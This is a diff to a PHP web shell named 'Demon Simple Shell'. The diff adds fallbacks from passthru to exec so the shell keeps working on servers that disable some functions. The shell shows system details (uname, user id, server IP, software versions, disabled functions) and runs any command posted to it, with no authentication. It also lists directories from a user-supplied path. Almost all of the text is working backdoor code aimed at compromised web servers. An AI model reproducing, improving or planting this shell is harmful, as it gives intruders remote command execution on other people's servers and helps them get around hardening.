@@ -1,4 +1,4 @@
-<!--(Demon Simple Shell Developed By Arash Khazaei A.K.A Xodiak And The Nonexistent)-->
+<!--(Developed By Arash Khazaei A.K.A Xodiak And The Nonexistent)-->
 <html>
 <head>
     <title>Demon Simple Shell</title>
@@ -63,21 +63,58 @@
 </center>
 <div id="normaltext">
     <?php
-    echo "Uname -a~:".php_uname();
+    if (function_exists("php_uname"))
+    {
+        echo "Uname -a~:".php_uname();
+    }
+    else
+    {
+        if (function_exists("passthru"))
+        {
+            echo "Uname -a~:".passthru("uname -a");           
+        }
+        else if (function_exists("exec")) 
+        {
+            echo "Uname -a~:".exec("uname -a");   
+        }
+    }
     echo "<br>";
-    echo "Id(User):";
-    echo passthru("id");
+    if (function_exists("passthru"))
+        {
+            echo "Id(User):";
+            echo passthru("id");           
+        }
+    else if (function_exists("exec")) 
+        {
+            echo "Id(User):";
+            echo exec("id");  
+        }
     echo "<br>";
+    if (function_exists("gethostname") && function_exists("gethostbyname"))
+    {
     $host= gethostname();
     $ip = gethostbyname($host);
+    }
     echo "Server Ip:" . $ip;
     echo "<br>";
     echo "Your Ip:" . $_SERVER['REMOTE_ADDR'];
     echo "<br>";
+    if (function_exists("phpversion"))
+    {
     echo "PHP Version~:".phpversion();
+    }
+    if (function_exists("getcwd"))
+    {
     echo "<br> PWD~: ".getcwd(); echo '/';
+    }
+    if (function_exists("mysql_get_server_info"))
+    {
     echo "<br>Mysql Version~: ".mysql_get_server_info();
+    }
+    if (function_exists("apache_get_version"))
+    {
     echo "<br>Apache Version~: ".apache_get_version();
+    }
     ?>
     <br/>Disabled Functions: <?php error_reporting(E_ALL); $disabled_functions = ini_get('disable_functions'); if ($disabled_functions!='') { $arr = explode(',', $disabled_functions); sort($arr); echo '<font color=darkred>Disabled Functions:<br>'; for ($i=0; $i<count($arr); $i++){ echo $arr[$i].' - </font>';} } else { echo '<font color=lightgreen>All Functions Are Enabled</font>';} ?> 
     <hr>
@@ -120,14 +157,34 @@ if (isset($_POST['wdir']))
 $wdir = $_POST['wdir'];
 }
 if (isset($_POST['command'])){
+    if (function_exists("passthru"))
+    {
     htmlspecialchars(passthru($command));
+    }
+    else if (function_exists("exec"))
+    {
+        echo exec($command);
+    }
 }
 if($command == ""){
-    htmlspecialchars(passthru("ls -lart $wdir"));
-
+    if (function_exists("passthru"))
+    {
+        htmlspecialchars(passthru("ls -lart $wdir"));
+    }
+    else if (function_exists("exec"))
+    {
+        echo exec("ls -lart $wdir");
+    }
 }else
 {
-    echo htmlspecialchars($command);
+    if (function_exists("passthru"))
+    {
+        echo htmlspecialchars($command);
+    }
+    else if (function_exists("exec"))
+    {
+        echo exec($command);
+    }
 }
 ?>
 </textarea>
